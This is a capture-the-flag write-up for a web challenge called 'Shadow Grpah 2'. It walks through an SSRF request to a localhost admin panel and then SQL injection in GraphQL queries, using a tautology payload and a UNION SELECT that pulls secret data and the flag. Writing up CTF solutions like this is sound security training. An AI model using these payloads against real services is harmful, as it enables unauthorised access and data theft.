# Shadow Grpah 2

<figure><img src="https://miro.medium.com/v2/resize:fit:546/1*b0NXQyQsCg6w_XDiJ-EuXA.png" alt="" height="373" width="485"><figcaption></figcaption></figure>

SSRF to GraphQL SQL Injection Exploitation

Step 1: Identifying Key Information

While inspecting the source code, we find two important notes:

* **From `/index.html`:**
* `<!-- Oops!! Check internal/admin for testing -->`
* **From `/dashboard`:**
* `<!-- Note for admins only: Use the fetch utility for internal testing on port 4000 -->`

These hints suggest that we need to access the **internal admin panel** via **SSRF**.

Step 2: Exploiting SSRF to Gain Admin Access

To access the internal admin panel, we can exploit SSRF using the `fetch` utility:

```
"https://shadow-two.espark.tn/fetch?url=http://localhost:4000/internal/admin"
```

This allows us to escalate privileges and gain access as an **admin**.

Step 3: Accessing GraphQL and Identifying Queries

Now that we have admin access, we navigate to the `/graphql` endpoint and explore the available queries:

```
getUser(username: String)
getAllProducts
getProductById(id: Int)
```

To test for SQL injection, we try the following query:

```
{
  getUser(username: "admin' OR '1'='1") {
    id
    username
    role
  }
}
```

This confirms a **SQL injection vulnerability** in the `getUser` query.

Step 4: Exploiting SQL Injection to Retrieve the Flag

Using SQL injection in the `getProductById` query, we attempt to extract **sensitive data**:

```
{
  getProductById(id: "-1 UNION SELECT 3, secret_info, 'description', 0 FROM product_secrets WHERE product_id = 3") {
    id
    name
    description
    price
  }
}
```

By executing this payload, we retrieve **secret information**, which includes the **flag**.

Spark{s0\_M4ny\_w4yss\_t0\_w1N!!!}
